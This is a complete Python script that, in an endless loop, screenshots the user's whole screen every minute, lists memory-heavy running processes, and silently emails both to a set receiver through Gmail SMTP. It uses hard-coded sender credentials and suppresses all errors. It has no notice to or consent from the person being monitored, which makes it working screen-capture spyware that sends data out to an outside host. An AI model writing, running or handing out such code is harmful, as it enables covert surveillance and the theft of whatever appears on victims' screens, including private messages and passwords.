import os, smtplib, time, psutil
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from mss import mss
from PIL import Image

#make sure sender's email has activated https://myaccount.google.com/lesssecureapps

def bytes2human(n):
    symbols = ('KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB')
    prefix = {}
    for i, s in enumerate(symbols):
        prefix[s] = 1 << (i + 1) * 10
    for s in reversed(symbols):
        if n >= prefix[s]:
            value = float(n) / prefix[s]
            return '%.1f%s' % (value, s)
    return "%sB" % n

Subject = 'ENTER SUBJECT EMAIL' #subject email
Sender = 'ENTER SENDER EMAIL @gmail.com' #email sender
Passwd = 'ENTER SENDER PASSWD' #password sender
Receiver = 'ENTER RECEIVER EMAIL' #email receiver
ServerSMTP = 'smtp.gmail.com' #server smtp gmail
PortSMTP = 587 #port smtp gmail

while True: #Loop till end of time
	with mss() as sct:
		sct.shot() #Cheese!
	
	#Check What Program Currently Running
	memory = ([(p.pid, p.info['name'], p.info['memory_info'].rss) for p in psutil.process_iter(attrs=['name', 'memory_info']) if p.info['memory_info'].rss > 50 * 1024 * 1024])
	memorydone = 'PID, NAME, MEMORY\n'
	for i in memory:
		memorydone += str(i[0]) +" "+ str(i[1]) +" "+ bytes2human(i[2]) +'\n'
	
	im = Image.open("monitor-1.png")
	im = im.convert('RGB')
	im.save("monitor-1.jpg",quality=60) #convert to jpg and lower quality for data savings
	
	img_data = open('monitor-1.jpg', 'rb').read()
	msg = MIMEMultipart()
	msg['Subject'] = Subject
	msg['From'] = Sender
	msg['To'] = Receiver
	
	text = MIMEText(memorydone)
	msg.attach(text)
	image = MIMEImage(img_data, name=os.path.basename('monitor-1.jpg'))
	msg.attach(image)
	try:
		s = smtplib.SMTP(ServerSMTP, PortSMTP)
		s.ehlo()
		s.starttls()
		s.ehlo()
		s.login(Sender, Passwd)
		s.sendmail(Sender, Receiver, msg.as_string())
		s.quit()
		time.sleep(60) #pause 1 minute
	except:
		pass